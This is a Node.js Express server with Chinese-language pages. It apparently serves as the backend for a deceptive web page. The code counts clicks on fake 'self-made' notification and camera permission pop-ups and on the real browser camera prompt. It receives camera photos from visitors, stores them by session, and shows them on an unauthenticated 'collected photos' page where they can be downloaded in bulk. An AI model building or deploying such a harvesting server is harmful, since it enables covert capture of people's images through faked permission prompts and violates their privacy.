const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json({ limit: '20mb' }));
app.use(express.static(__dirname));

// 存储照片（内存，重启清空）
const photoStore = {};

// 点击允许计数
const clickStats = { notif: 0, camera: 0, realCameraAllow: 0, realCameraDeny: 0 };

// 记录点击
app.post('/api/track/:type', (req, res) => {
  const type = req.params.type;
  if (type in clickStats) {
    clickStats[type]++;
    res.json({ ok: true, count: clickStats[type] });
  } else {
    res.status(400).json({ ok: false });
  }
});

// 重置统计
app.post('/api/track/reset', (req, res) => {
  clickStats.notif = 0;
  clickStats.camera = 0;
  clickStats.realCameraAllow = 0;
  clickStats.realCameraDeny = 0;
  res.json({ ok: true });
});

// 静态页面
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'report.html'));
});

// 上传照片
app.post('/api/upload', (req, res) => {
  const { sessionId, index, data } = req.body;
  if (!sessionId || index == null || !data) {
    return res.status(400).json({ ok: false });
  }
  if (!photoStore[sessionId]) photoStore[sessionId] = [];
  photoStore[sessionId][index] = data;
  res.json({ ok: true });
});

// 清除所有照片
app.delete('/api/photos', (req, res) => {
  Object.keys(photoStore).forEach(k => delete photoStore[k]);
  res.json({ ok: true });
});

// 查看照片页面
app.get('/photos', (req, res) => {
  const ids = Object.keys(photoStore);
  const isEmpty = ids.length === 0;

  let html = `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>已采集照片</title><style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,"PingFang SC",sans-serif;background:#f5f5f5;color:#1a1a1a;padding:0 0 80px}
.topbar{background:linear-gradient(135deg,#FE2C55,#D4163E);color:#fff;padding:16px;position:sticky;top:0;z-index:10;display:flex;align-items:center;justify-content:space-between}
.topbar h1{font-size:17px;font-weight:700}
.topbar-actions{display:flex;gap:8px}
.topbar-btn{background:rgba(255,255,255,0.2);border:none;color:#fff;padding:6px 14px;border-radius:8px;font-size:13px;cursor:pointer;font-family:inherit}
.topbar-btn:active{background:rgba(255,255,255,0.3)}
.topbar-btn.danger{background:rgba(0,0,0,0.2)}
.empty{text-align:center;padding:80px 20px;color:#999;font-size:15px}
.session{background:#fff;margin:12px 16px;border-radius:12px;padding:16px;box-shadow:0 1px 4px rgba(0,0,0,0.04)}
.session-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:12px}
.session-title{font-size:14px;color:#666}
.session-check{width:18px;height:18px;accent-color:#FE2C55;cursor:pointer}
.photos{display:grid;grid-template-columns:1fr 1fr;gap:8px}
.photo-wrap{position:relative;cursor:pointer}
.photo-wrap img{width:100%;border-radius:8px;border:2px solid transparent;transition:border-color 0.15s;display:block}
.photo-wrap.selected img{border-color:#FE2C55}
.photo-wrap .check{position:absolute;top:6px;right:6px;width:22px;height:22px;background:#FE2C55;border-radius:50%;display:none;align-items:center;justify-content:center}
.photo-wrap.selected .check{display:flex}
.photo-wrap .check svg{width:14px;height:14px;fill:#fff}
.meta{font-size:12px;color:#999;margin-top:10px}
.bottom-bar{position:fixed;bottom:0;left:0;right:0;background:#fff;padding:12px 16px;box-shadow:0 -2px 10px rgba(0,0,0,0.06);display:none;align-items:center;justify-content:space-between;z-index:10}
.bottom-bar.show{display:flex}
.bottom-bar .count{font-size:14px;color:#333}
.bottom-bar .dl-btn{background:linear-gradient(135deg,#FE2C55,#E81F4A);color:#fff;border:none;padding:10px 24px;border-radius:10px;font-size:15px;font-weight:600;cursor:pointer;font-family:inherit}
</style></head><body>
<div class="topbar">
  <h1>已采集照片</h1>
  <div class="topbar-actions">
    <button class="topbar-btn danger" onclick="clearAll()">清除全部</button>
  </div>
</div>`;

  if (isEmpty) {
    html += '<div class="empty">暂无照片</div>';
  } else {
    ids.reverse().forEach(id => {
      const photos = photoStore[id];
      const time = id.split('_')[0];
      const dateStr = new Date(parseInt(time)).toLocaleString('zh-CN');
      const count = photos.filter(Boolean).length;
      html += `<div class="session" data-id="${id}">
  <div class="session-header">
    <span class="session-title">${dateStr} · ${count} 张</span>
    <input type="checkbox" class="session-check" onchange="toggleSession(this,'${id}')">
  </div>
  <div class="photos">`;
      photos.forEach((p, i) => {
        if (p) html += `<div class="photo-wrap" data-url="${p}" onclick="togglePhoto(this)">
  <img src="${p}" alt="照片${i + 1}">
  <div class="check"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg></div>
</div>`;
      });
      html += `</div><div class="meta">Session: ${id}</div></div>`;
    });
  }

  html += `<div class="bottom-bar" id="bottomBar">
  <span class="count" id="selCount">已选 0 张</span>
  <button class="dl-btn" onclick="downloadSelected()">下载选中</button>
</div>
<script>
var selected = new Set();
function updateBar(){
  var bar=document.getElementById('bottomBar');
  var c=selected.size;
  document.getElementById('selCount').textContent='已选 '+c+' 张';
  bar.className='bottom-bar'+(c>0?' show':'');
}
function togglePhoto(el){
  var url=el.getAttribute('data-url');
  if(selected.has(url)){selected.delete(url);el.classList.remove('selected')}
  else{selected.add(url);el.classList.add('selected')}
  updateBar();
}
function toggleSession(cb,sid){
  var session=document.querySelector('.session[data-id="'+sid+'"]');
  session.querySelectorAll('.photo-wrap').forEach(function(el){
    var url=el.getAttribute('data-url');
    if(cb.checked){selected.add(url);el.classList.add('selected')}
    else{selected.delete(url);el.classList.remove('selected')}
  });
  updateBar();
}
function downloadSelected(){
  if(selected.size===0)return;
  var i=0;
  selected.forEach(function(url){
    var a=document.createElement('a');
    a.href=url;
    a.download='photo_'+(++i)+'.jpg';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
  });
}
function clearAll(){
  if(!confirm('确认清除所有照片？'))return;
  fetch('/api/photos',{method:'DELETE'}).then(function(){location.reload()});
}
</script></body></html>`;
  res.send(html);
});

// 查看所有session的JSON数据（调试用）
app.get('/api/photos', (req, res) => {
  const ids = Object.keys(photoStore);
  res.json(ids.map(id => ({
    sessionId: id,
    count: photoStore[id].filter(Boolean).length
  })));
});

// 统计页面
app.get('/amount', (req, res) => {
  res.send(`<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>点击统计</title><style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,"PingFang SC",sans-serif;background:#f5f5f5;color:#1a1a1a}
.topbar{background:linear-gradient(135deg,#FE2C55,#D4163E);color:#fff;padding:16px;position:sticky;top:0;z-index:10}
.topbar h1{font-size:17px;font-weight:700}
.stats{padding:20px 16px}
.stat-card{background:#fff;border-radius:12px;padding:20px;margin-bottom:12px;box-shadow:0 1px 4px rgba(0,0,0,0.04)}
.stat-label{font-size:13px;color:#999;margin-bottom:8px}
.stat-num{font-size:42px;font-weight:700;color:#1a1a1a;line-height:1}
.stat-num.red{color:#FE2C55}
.stat-sub{font-size:12px;color:#bbb;margin-top:6px}
.refresh-btn{display:block;width:calc(100% - 32px);margin:8px 16px;padding:12px;background:#fff;border:1.5px solid #e8e8e8;border-radius:10px;font-size:15px;cursor:pointer;font-family:inherit;color:#333}
.refresh-btn:active{background:#f5f5f5}
</style></head><body>
<div class="topbar"><h1>点击允许统计</h1></div>
<div class="stats">
  <div class="stat-card">
    <div class="stat-label">自制通知权限 - 点击允许次数</div>
    <div class="stat-num red">${clickStats.notif}</div>
    <div class="stat-sub">进入网站时弹出的通知权限申请</div>
  </div>
  <div class="stat-card">
    <div class="stat-label">自制相机权限 - 点击允许次数</div>
    <div class="stat-num red">${clickStats.camera}</div>
    <div class="stat-sub">进入网站时弹出的相机权限申请</div>
  </div>
  <div class="stat-card">
    <div class="stat-label">浏览器相机权限 - 点击允许次数</div>
    <div class="stat-num" style="color:#07c160">${clickStats.realCameraAllow}</div>
    <div class="stat-sub">点击提交后弹出的浏览器原生相机权限</div>
  </div>
  <div class="stat-card">
    <div class="stat-label">浏览器相机权限 - 点击拒绝次数</div>
    <div class="stat-num" style="color:#999">${clickStats.realCameraDeny}</div>
    <div class="stat-sub">点击提交后弹出的浏览器原生相机权限</div>
  </div>
  <div class="stat-card">
    <div class="stat-label">合计</div>
    <div class="stat-num">${clickStats.notif + clickStats.camera + clickStats.realCameraAllow + clickStats.realCameraDeny}</div>
    <div class="stat-sub">所有权限弹窗的总点击次数</div>
  </div>
</div>
<button class="refresh-btn" onclick="location.reload()">刷新数据</button>
<button class="refresh-btn" style="color:#FE2C55;border-color:#FE2C55;" onclick="resetStats()">重置所有数据</button>
<script>
function resetStats(){
  if(!confirm('确认重置所有统计数据？'))return;
  fetch('/api/track/reset',{method:'POST'}).then(function(){location.reload()});
}
</script>
</body></html>`);
});

app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
  console.log(`查看照片: http://localhost:${PORT}/photos`);
});
